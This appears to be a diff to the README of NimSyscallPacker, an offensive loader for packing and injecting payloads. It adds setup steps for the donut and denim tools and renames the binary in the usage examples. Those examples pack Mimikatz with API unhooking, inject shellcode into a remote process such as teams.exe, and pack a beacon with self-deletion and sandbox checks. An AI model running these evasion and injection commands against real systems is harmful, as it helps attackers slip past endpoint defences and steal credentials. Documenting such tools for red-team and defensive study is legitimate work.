@@ -10,6 +10,10 @@ Make sure you use an up to date Nim version. It works fine for me with Nim versi
 
 Hellsgate currently doesn't compile correctly with the newest GCC versions. To make this work you have to use GCC v10.2.1 with MinGW-w64 v7.0.0 (https://github.com/brechtsanders/winlibs_mingw/releases/tag/10.2.1-snapshot20200912), and GCC v10.2.0 with MinGW-w64 v8.0.0 r5 (https://github.com/brechtsanders/winlibs_mingw/releases/tag/10.2.0-11.0.0-8.0.0-r5). See https://github.com/S3cur3Th1sSh1t-Sponsors/NimSyscallPacker/issues/2
 
+If you're using NimSyscallPacker from Windows you should download the latest [donut](https://github.com/TheWover/donut) release and [denim](https://github.com/moloch--/denim) for full functionality. `donut.exe` has to be dropped into the current working directory. Denim should be installed via `denim setup`.
+
+For Unix systems install donut via `pip3 install donut-shellcode`. `denim` cannot be used from Unix so obfuscation via LLVM is not possible here.
+
 ```
 NimSyscall_Loader v 1.1
 
@@ -54,7 +58,7 @@ Options:
 To pack Mimikatz for example with unhooking before execution and without patching AMSI use the following:
 
 ```
-NimSyscall_Loader.exe --file=mimikatz.exe --unhook --noAMSI --pe
+NimSyscallLoader --file=mimikatz.exe --unhook --noAMSI --pe
 ```
 
 Some of you had problems loading Mimikatz with the packer via "--file=Mimikatz --pe" arguments to afterwards issue custom commands on runtime.
@@ -71,29 +75,29 @@ Packedmimikatz.exe coffee exit
 To pack Shellcode for local injection:
 
 ```
-NimSyscall_Loader.exe --file=shellcode.bin --noAMSI
+NimSyscallLoader --file=shellcode.bin --noAMSI
 ```
 
 To load shellcode into a remote process:
 
 ```
-NimSyscall_Loader.exe --file=shellcode.bin --noAMSI --remoteprocess=teams.exe
+NimSyscallLoader --file=shellcode.bin --noAMSI --remoteprocess=teams.exe
 ```
 
 To load a C# assembly:
 ```
-NimSyscall_Loader.exe --file=Seatbelt.exe --csharp
+NimSyscallLoader --file=Seatbelt.exe --csharp
 ```
 
 To load a C# assembly and use hellsgate for Syscall retrieval :
 ```
-NimSyscall_Loader.exe --file=Seatbelt.exe --csharp --hellsgate
+NimSyscallLoader --file=Seatbelt.exe --csharp --hellsgate
 ```
 
 To pack Shellcode for local injection + hellsgate usage + self-delete + sandbox checks:
 
 ```
-NimSyscall_Loader.exe --file=beacon.bin --hellsgate --self-delete --sandbox=DomainJoined,MemorySpace
+NimSyscallLoader --file=beacon.bin --hellsgate --self-delete --sandbox=DomainJoined,MemorySpace
 ```
 
 ## CREDITS
